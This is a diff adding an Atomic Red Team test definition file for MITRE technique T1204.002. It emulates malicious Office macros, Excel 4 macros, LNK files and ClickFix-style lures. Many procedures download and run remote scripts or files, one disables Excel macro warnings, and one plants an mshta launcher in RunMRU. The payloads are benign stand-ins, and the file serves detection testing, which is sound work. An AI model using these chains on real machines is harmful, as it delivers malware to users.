@@ -1,0 +1,369 @@
+{
+  "attack_technique": "T1204.002",
+  "display_name": "User Execution: Malicious File",
+  "atomic_tests": [
+    {
+      "name": "OSTap Style Macro Execution",
+      "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "jse_path",
+          "description": "Path for the macro to write out the \"malicious\" .jse file",
+          "type": "string",
+          "default": "C:\\Users\\Public\\art.jse"
+        },
+        {
+          "arg_name": "ms_product",
+          "description": "Maldoc application Word or Excel",
+          "type": "string",
+          "default": "Word"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Microsoft #{ms_product} must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "8bebc690-18c7-4549-bc98-210f7019efff"
+    },
+    {
+      "name": "OSTap Payload Download",
+      "description": "Uses cscript //E:jscript to download a file",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "cleanup_command": "del #{script_file} /F /Q >nul 2>&1",
+        "procedure": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "script_file",
+          "description": "File to execute jscript code from",
+          "type": "path",
+          "default": "%TEMP%\\OSTapGet.js"
+        },
+        {
+          "arg_name": "file_url",
+          "description": "URL to retrieve file from",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
+        }
+      ],
+      "auto_generated_guid": "3f3af983-118a-4fa1-85d3-ba4daa739d80"
+    },
+    {
+      "name": "Maldoc choice flags command execution",
+      "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "ms_product",
+          "description": "Maldoc application Word or Excel",
+          "type": "string",
+          "default": "Word"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Microsoft #{ms_product} must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "0330a5d2-a45a-4272-a9ee-e364411c4b18"
+    },
+    {
+      "name": "OSTAP JS version",
+      "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "jse_path",
+          "description": "jse file to execute with wscript",
+          "type": "path",
+          "default": "C:\\Users\\Public\\art.jse"
+        },
+        {
+          "arg_name": "ms_product",
+          "description": "Maldoc application Word or Excel",
+          "type": "string",
+          "default": "Word"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Microsoft #{ms_product} must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "add560ef-20d6-4011-a937-2c340f930911"
+    },
+    {
+      "name": "Office launching .bat file from AppData",
+      "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "bat_path",
+          "description": "Path to malicious .bat file",
+          "type": "string",
+          "default": "$(\"$env:temp\\art1204.bat\")"
+        },
+        {
+          "arg_name": "ms_product",
+          "description": "Maldoc application Word or Excel",
+          "type": "string",
+          "default": "Word"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Microsoft #{ms_product} must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "9215ea92-1ded-41b7-9cd6-79f9a78397aa"
+    },
+    {
+      "name": "Excel 4 Macro",
+      "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore",
+        "procedure": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "download_url",
+          "description": "Download URL",
+          "type": "string",
+          "default": "https://live.sysinternals.com/procexp.exe"
+        },
+        {
+          "arg_name": "uname",
+          "description": "Username for pathing",
+          "type": "string",
+          "default": "$env:Username"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Microsoft Excel must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "4ea1fc97-8a46-4b4e-ba48-af43d2a98052"
+    },
+    {
+      "name": "Headless Chrome code execution via VBA",
+      "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Stop-Process -name mshta",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\""
+      },
+      "input_arguments": [],
+      "dependencies": [
+        {
+          "description": "Microsoft Word must be installed",
+          "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\""
+        },
+        {
+          "description": "Google Chrome must be installed",
+          "prereq_command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "a19ee671-ed98-4e9d-b19c-d1954a51585a"
+    },
+    {
+      "name": "Potentially Unwanted Applications (PUA)",
+      "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore",
+        "procedure": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "pua_url",
+          "description": "url to PotentiallyUnwanted.exe",
+          "type": "url",
+          "default": "http://amtso.eicar.org/PotentiallyUnwanted.exe"
+        },
+        {
+          "arg_name": "pua_file",
+          "description": "path to PotentiallyUnwanted.exe",
+          "type": "path",
+          "default": "$env:TEMP/PotentiallyUnwanted.exe"
+        }
+      ],
+      "auto_generated_guid": "02f35d62-9fdc-4a97-b899-a5d9a876d295"
+    },
+    {
+      "name": "Office Generic Payload Download",
+      "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore",
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "macro_path",
+          "description": "Location of file which will be converted to a VBA macro",
+          "type": "path",
+          "default": "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt"
+        },
+        {
+          "arg_name": "c2_domain",
+          "description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.",
+          "type": "url",
+          "default": null
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Destination c2_domain name or IP address must be set to a running HTTP server.",
+          "prereq_command": "if (#{c2_domain}) (exit 0) else (exit 1)",
+          "get_prereq_command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\""
+        },
+        {
+          "description": "Microsoftt #{ms_product} must be installed",
+          "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
+          "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\""
+        }
+      ],
+      "auto_generated_guid": "5202ee05-c420-4148-bf5e-fd7f7d24850c"
+    },
+    {
+      "name": "LNK Payload Download",
+      "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore",
+        "procedure": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "581d7521-9c4b-420e-9695-2aec5241167f"
+    },
+    {
+      "name": "Mirror Blast Emulation",
+      "description": "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed.\nRequires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security\" /v \"VBAWarnings\" /f",
+        "procedure": "Cd \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\"\nNew-ItemProperty -Path Registry::HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Excel\\Security -Name \"VBAWarnings\" -Value \"1\" -PropertyType DWORD -Force | Out-Null\n& '.\\Excel 2016.lnk' \"PathToAtomicsFolder\\T1204.002\\bin\\mirrorblast_emulation.xlsm\""
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "24fd9719-7419-42dd-bce6-ab3463110b3c"
+    },
+    {
+      "name": "ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell",
+      "description": "Simulates a ClickFix-style campaign by adding a malicious entry to the RunMRU registry key that launches `mshta.exe` with a remote payload.\nThis technique relies on user interaction (Win+R + Enter) to trigger execution.\nUsed in social engineering campaigns that aim to bypass traditional startup methods.\nReference: https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" -Name \"atomictest\" -ErrorAction SilentlyContinue",
+        "procedure": "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" -Name \"atomictest\" -Value '\"C:\\Windows\\System32\\mshta.exe\" http://localhost/hello6.hta'"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "3f3120f0-7e50-4be2-88ae-54c61230cb9f"
+    },
+    {
+      "name": "Simulate Click-Fix via Downloaded BAT File",
+      "description": "Simulates user execution of a BAT file downloaded from the Atomic Red Team GitHub repository.This test represents T1204.002 - User Execution via Malicious File.The BAT file performs harmless terminal output to simulate a \"fix\" operation.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "if (Test-Path \"$env:TEMP\\click-fix-pid.txt\") {\n  $pid = Get-Content \"$env:TEMP\\click-fix-pid.txt\"\n  Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue\n  Remove-Item \"$env:TEMP\\click-fix-pid.txt\" -ErrorAction SilentlyContinue\n}\nRemove-Item \"#{outfile}\" -ErrorAction SilentlyContinue",
+        "procedure": "$url = \"#{url}\"\n$outfile = \"#{outfile}\"\nInvoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing\n$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal\n$process.Id | Out-File \"$env:TEMP\\click-fix-pid.txt\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "url",
+          "description": "URL to download the BAT file from",
+          "type": "url",
+          "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat"
+        },
+        {
+          "arg_name": "outfile",
+          "description": "Path where the BAT file will be saved",
+          "type": "path",
+          "default": "$env:TEMP\\click-fix.bat"
+        }
+      ],
+      "auto_generated_guid": "22386853-f68d-4b50-a362-de235127c443"
+    }
+  ]
+}
